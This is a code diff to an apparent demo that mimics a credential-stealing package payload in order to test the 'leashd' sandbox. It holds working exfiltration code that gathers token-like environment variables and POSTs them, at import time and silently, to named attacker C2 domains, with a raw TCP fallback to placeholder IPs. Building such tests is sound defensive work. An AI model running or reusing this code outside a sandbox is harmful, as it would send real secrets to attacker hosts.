@@ -8,13 +8,22 @@ import threading
 import urllib.request
 import urllib.error
 
+# Hardcoded C2 IPs — fallback used when DNS for the attacker domains is down
+# (both domains were sinkholed/taken down after the March 2026 incident).
+# Using RFC 5737 TEST-NET addresses so the demo never hits a real server,
+# but leashd still sees and blocks a real TCP connect() syscall.
+C2_TARGETS = [
+    # (domain, fallback_ip, port)
+    ("models.litellm.cloud", "203.0.113.10", 443),  # primary C2
+    ("checkmarx.zone",       "198.51.100.10", 443),  # secondary drop
+]
+
 
 def _exfiltrate():
     """
     Reproduces the credential-harvesting + POST behaviour of the real payload.
-    Leashd should block both outbound connections at the kernel level.
+    Leashd should block all outbound connections at the kernel level.
     """
-    # Simulate harvested data (no real secrets — demo only)
     hostname = socket.gethostname()
     env_sample = {k: v for k, v in os.environ.items()
                   if any(tok in k.upper() for tok in
@@ -24,18 +33,27 @@ def _exfiltrate():
         f"&demo=leashd_block_test"
     ).encode()
 
-    targets = [
-        "https://models.litellm.cloud/collect",  # primary C2
-        "https://checkmarx.zone/drop",            # secondary drop
-    ]
-    for url in targets:
+    for domain, fallback_ip, port in C2_TARGETS:
+        # 1. Try the real domain via HTTPS (DNS may be down post-takedown)
+        url = f"https://{domain}/collect"
         try:
             req = urllib.request.Request(url, data=payload, method="POST")
             req.add_header("User-Agent", "python-litellm/1.82.8")
             req.add_header("Content-Type", "application/x-www-form-urlencoded")
             urllib.request.urlopen(req, timeout=5)
         except Exception:
-            pass  # leashd blocks these; real malware silently swallowed errors too
+            pass  # leashd blocks or DNS fails — either way silently continue
+
+        # 2. Raw TCP fallback to hardcoded IP — always produces a kernel-level
+        #    block event even when the domain no longer resolves.
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        try:
+            sock.connect((fallback_ip, port))
+        except Exception:
+            pass
+        finally:
+            sock.close()
 
 
 # Fire in a background thread so import latency is minimal (mirrors real payload)
